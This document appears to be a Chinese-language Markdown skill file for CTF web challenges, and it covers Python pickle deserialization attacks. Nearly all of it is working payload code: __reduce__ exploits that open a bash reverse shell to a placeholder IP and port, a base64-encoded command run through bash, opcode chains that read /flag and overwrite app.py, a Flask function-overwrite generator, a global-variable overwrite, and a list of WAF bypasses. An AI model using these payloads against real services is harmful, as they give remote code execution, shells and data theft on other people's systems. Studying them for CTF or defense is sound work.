---
name: pickle-deserialization
description: Use when encountering pickle反序列化漏洞 - Python RCE、opcode手搓、函数覆盖、变量覆盖
---

# Pickle反序列化攻击

## Info

- **Domain**: web
- **Tags**: web, pickle, python, deserialization, rce

## 1. 基础原理

Pickle 是 Python 内置的序列化/反序列化模块，能将任意 Python 对象转换为二进制流并还原。

**与 JSON 的区别**：
- JSON 只能表示基本类型（数值、字符串、列表、字典）
- Pickle 能序列化几乎任意 Python 对象（类实例、函数、复杂数据结构）
- **警告**：pickle 模块不安全，恶意构造的 pickle 数据在反序列化时可执行任意代码

```python
import pickle
import base64

data = {"name": "Alice", "age": 30}
pickled_bytes = pickle.dumps(data)
base64_str = base64.b64encode(pickled_bytes).decode('utf-8')

# 反序列化
decoded_bytes = base64.b64decode(base64_str.encode('utf-8'))
loaded_data = pickle.loads(decoded_bytes)
```

## 2. __reduce__ 方法利用

`__reduce__` 在反序列化时自动调用，返回描述如何重构对象的可调用对象和参数元组。

### 基础 RCE Payload

```python
# os.system
import pickle, os, base64

class exp(object):
    def __reduce__(self):
        s = """bash -c "/bin/bash -i >& /dev/tcp/IP/PORT 0>&1" """
        return os.system, (s,)

e = exp()
s = pickle.dumps(e)
user = base64.b64encode(s).decode()
print(user)
```

```python
# subprocess.check_output
import subprocess, pickle, base64

class exp():
    def __reduce__(self):
        return (subprocess.check_output, (["cp","/flag","/app/app.py"],))
        # 或反弹shell:
        # return (subprocess.check_output, (["bash", "-c", "bash -i >& /dev/tcp/IP/PORT 0>&1"],))

e = exp()
exp_data = pickle.dumps(e)
user_b64 = base64.b64encode(exp_data).decode()
print(user_b64)
```

```python
# eval 读取文件
import pickle, urllib

class test(object):
    def __reduce__(self):
        return (eval, ("open('/flag.txt', 'r').read()",))

a = test()
s = pickle.dumps(a)
print(urllib.quote(s))
```

## 3. Pickle Opcode 手搓

当 `__reduce__` 不够用时（如 exec 被禁用、一次需执行多个函数），需手动拼接 opcode。

Pickle 使用基于栈的虚拟机，由一系列操作码组成。

### 基础 Opcode Payload

```python
import base64

# 基础 system 调用
opcode = b'''cos
system
(S'bash -c "{echo,cHl0aG9uMyAtYyAi..."}|{base64,-d}|{bash,-i}"'
tR.'''
opcode = base64.b64encode(opcode).decode("utf-8")
print(opcode)
```

### R 指令被 WAF 时用 o 替代

```python
import base64

payload = b'''(cos
system
S'bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"'
o.'''   # 用 o 替代 R

print(base64.b64encode(payload).decode())
```

## 4. 函数覆盖（Flask 场景）

通过 pickle 修改目标函数的 `__code__` 属性，替换其执行逻辑。

```python
import pickle
import pickletools
import base64


def generate_pickle_consts(consts, memo_id_start):
    """递归生成 pickle opcode 序列，支持 None, str, int, tuple 类型"""
    lines = []
    if consts is None:
        lines.append(b'N')
    elif isinstance(consts, str):
        escaped_str = repr(consts)[1:-1]
        lines.append(f"S'{escaped_str}'\n".encode('ascii'))
    elif isinstance(consts, int):
        lines.append(f"I{consts}\n".encode('ascii'))
    elif isinstance(consts, tuple):
        lines.append(b'(')
        for item in consts:
            lines.extend(generate_pickle_consts(item, memo_id_start))
        lines.append(b't')
    else:
        raise ValueError(f"Unsupported const type: {type(consts)}")
    return lines


def generate_co_consts_pickle(consts_tuple, memo_id=12):
    lines = generate_pickle_consts(consts_tuple, [memo_id])
    lines.append(b'p' + str(memo_id).encode('ascii') + b'\n')
    lines.append(b'0')
    return b''.join(lines)


def generate_co_names_pickle(names_tuple, memo_id=13):
    lines = [b'(']
    for name in names_tuple:
        escaped_name = repr(name)[1:-1]
        lines.append(f"S'{escaped_name}'\n".encode('ascii'))
    lines.append(b't')
    lines.append(b'p' + str(memo_id).encode('ascii') + b'\n')
    lines.append(b'0')
    return b''.join(lines)


def generate_co_varnames_pickle(varnames_tuple, memo_id=14):
    lines = [b'(']
    for name in varnames_tuple:
        escaped_name = repr(name)[1:-1]
        lines.append(f"S'{escaped_name}'\n".encode('ascii'))
    lines.append(b't')
    lines.append(b'p' + str(memo_id).encode('ascii') + b'\n')
    lines.append(b'0')
    return b''.join(lines)


def generate_rce_pickle(target_module='__main__', target_func='src', new_source='''
def src():
    return open('app.py', 'r').read()
'''):
    local_scope = {}
    exec(new_source, local_scope)
    new_func = local_scope[target_func]
    code_obj = new_func.__code__
    co_code_escaped = code_obj.co_code

    co_consts = generate_co_consts_pickle(code_obj.co_consts, memo_id=12)
    co_names = generate_co_names_pickle(code_obj.co_names, memo_id=13)
    co_varnames = generate_co_varnames_pickle(code_obj.co_varnames, memo_id=14)

    p1_template = '''cbuiltins
getattr
p0
0c{target_module}
{target_func}
p3
0g0
(g3
S'__code__'
tRp4
0I{co_argcount}
p5
0I{co_posonlyargcount}
p6
0I{co_kwonlyargcount}
p7
0I{co_nlocals}
p8
0I{co_stacksize}
p9
0I{co_flags}
p10
0c_codecs
encode
p33
(V'''
    p2 = '''
S'latin-1'
tRp11
0{co_consts}{co_names}{co_varnames}g0
(g4
S'co_filename'
tRp15
0g0
(g4
S'co_name'
tRp16
0g0
(g4
S'co_qualname'
tRp22
0I{co_firstlineno}
p17
0g0
(g4
S'co_lnotab'
tRp18
0g0
(g4
S'co_exceptiontable'
tRp23
0(tp19
0(tp20
0ctypes
CodeType
(g5
g6
g7
g8
g9
g10
g11
g12
g13
g14
g15
g16
g22
g17
g18
g23
g19
g20
tRp21
0cbuiltins
setattr
(g3
S'__code__'
g21
tR.'''

    p1 = p1_template.format(
        target_module=target_module,
        target_func=target_func,
        co_argcount=code_obj.co_argcount,
        co_posonlyargcount=code_obj.co_posonlyargcount,
        co_kwonlyargcount=code_obj.co_kwonlyargcount,
        co_nlocals=code_obj.co_nlocals,
        co_stacksize=code_obj.co_stacksize,
        co_flags=code_obj.co_flags,
    ).encode('ascii')
    p2 = p2.format(
        co_consts=co_consts.decode('ascii'),
        co_names=co_names.decode('ascii'),
        co_varnames=co_varnames.decode('ascii'),
        co_firstlineno=code_obj.co_firstlineno
    ).encode('ascii')

    return p1 + co_code_escaped + p2


if __name__ == "__main__":
    target_func = 'src'
    new_source = '''
def src():
    return
'''
    p1 = generate_rce_pickle(target_func=target_func, new_source=new_source)
    print(p1)
    pickletools.dis(p1)
    encrypted_p1 = base64.b64encode(p1)
    print("Base64:", encrypted_p1.decode())
```

## 5. 变量覆盖

```python
# 覆盖 __main__ 模块中的全局变量
b'c__main__\n__dict__\n(S"secret"\nS"hacked"\ndb'
```

## 6. 复杂 Opcode 链（读文件写文件）

```python
# 打开 /flag，读取内容，写入 ./app.py
pickle_data = b"cbuiltins\ngetattr\np0\n0cbuiltins\nopen\np1\n0g1\n(S'/flag'\ntRp2\n0g0\n(g2\nS'read'\ntRp3\n0g3\n(tRp4\n0g1\n(\nS'./app.py'\nS'w'\ntRp5\n0g0\n(g5\nS'write'\ntRp6\n0g6\n(g4\ntR."

# 解析:
# c builtins\ngetattr\n p0\n → 准备 getattr 函数
# c builtins\nopen\n p1\n → 准备 open 函数
# g1\n ( S'/flag'\n tR p2\n → open('/flag')
# g0\n ( g2\n S'read'\n tR p3\n → getattr(file_obj, 'read')
# g3\n ( tR p4\n → read() 执行，得到文件内容
# g1\n ( S'./app.py'\n S'w'\n tR p5\n → open('./app.py', 'w')
# g0\n ( g5\n S'write'\n tR p6\n → getattr(write_file, 'write')
# g6\n ( g4\n tR . → write(content) 写入
```

## 7. 常见 WAF 绕过

| 被过滤 | 绕过方法 |
|--------|----------|
| `R` (REDUCE) | 用 `o` (OBJ) 替代 |
| `exec` | 用 `eval` 或 `os.system` |
| `os` | 用 `subprocess` 或 `builtins.getattr` |
| 特定函数名 | 手搓 opcode 组合 |

## 8. 反序列化触发点

```python
# 常见触发点
pickle.loads(data)
pickle.load(file)
pickle.Unpickler(file).load()

# Flask session 中
# 如果 session 使用 pickle 序列化
```
